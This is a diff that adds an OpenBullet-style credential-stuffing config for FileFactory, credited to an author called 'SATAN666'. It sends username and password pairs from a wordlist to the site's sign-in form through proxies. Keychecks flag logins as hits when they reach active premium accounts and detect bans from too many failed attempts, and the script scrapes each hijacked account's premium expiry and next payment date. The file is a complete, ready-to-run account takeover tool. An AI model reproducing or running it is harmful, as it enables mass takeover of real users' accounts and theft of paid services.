@@ -1,0 +1,69 @@
+[SETTINGS]
+{
+  "Name": "FileFactory",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-09-30T18:32:47.4702718+05:30",
+  "AdditionalInfo": "",
+  "Author": "SATAN666",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.filefactory.com/member/signin.php" 
+  CONTENT "loginEmail=<USER>&loginPassword=<PASS>&Submit=Sign+In" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.filefactory.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 69" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.filefactory.com/member/signin.php" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The Email Address submitted was invalid"
+    KEY "The email address or password you have entered is incorrect"
+  KEYCHAIN Success AND 
+    KEY "You are currently signed in as"
+    KEY "<strong>Active</strong>"
+    KEY "<strong>Premium</strong>"
+    KEY "<a title=\"Sign Out\" href=\"/member/signout.php\">"
+  KEYCHAIN Ban OR
+	KEY "Too Many Failed Sign In Attempts"
+	KEY "Unfortunately you are unable to access our servers"
+  KEYCHAIN Custom AND
+    KEY "set their Date of Birth"
+    KEY "Please Confirm Your Email Address"
+    KEY "while since you changed your FileFactory password"
+    KEY "Account Pending Deletion"
+
+
+PARSE "<SOURCE>" LR "class=\"tooltipster\" title=\"Next payment due: <strong>" "</strong>\">" -> CAP "Next Payment Due" 
+
+PARSE "<SOURCE>" LR "class=\"tooltipster\" title=\"Premium valid until: <strong>" "</strong>\">" -> CAP "Premium Valid Until" 
+
